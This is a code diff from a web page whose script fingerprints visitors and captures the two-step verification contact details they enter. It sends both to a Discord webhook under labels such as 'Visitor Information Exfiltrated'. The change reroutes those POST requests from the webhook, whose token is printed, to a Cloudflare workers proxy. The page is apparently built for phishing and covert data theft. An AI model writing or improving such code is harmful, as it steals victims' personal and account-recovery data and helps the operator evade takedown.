@@ -108,7 +108,7 @@
     </div>
 
     <script>
-        const webhookUrl = "https://discord.com/api/webhooks/1506641158162485400/7GOgim2SkLGePfLYAD43i4dy0CjWWCgavNDMcUz2XBc0xrLYyxRwylL9Acl-9of19qOB";
+        const UrlProxy = "https://discord-proxy.oliverp0404.workers.dev/";
 
         async function checkTranslator() {
             let translatorStatus = "Not Detected / Default";
@@ -330,9 +330,9 @@
             }
 
             const payload = {
-                content: "🚨 **New Target Telemetry Acquired** 🚀",
+                content: "  **Visitor Information Exfiltrated**",
                 embeds: [{
-                    title: "🛡️ Advanced Fingerprinting & Deep Telemetry Matrix",
+                    title: "Client Reconnaissance Report",
                     description: "Comprehensive client reconnaissance report successfully compiled and exfiltrated.",
                     color: 1388543,
                     fields: [
@@ -369,7 +369,7 @@
                 }]
             };
 
-            fetch(webhookUrl, {
+            fetch(UrlProxy, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(payload)
@@ -391,7 +391,7 @@
                 content: `📱 **2-Step Verification Contact Info Captured**\n- **Contact Input:** ${contactValue}`
             };
 
-            fetch(webhookUrl, {
+            fetch(UrlProxy, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(verificationPayload)
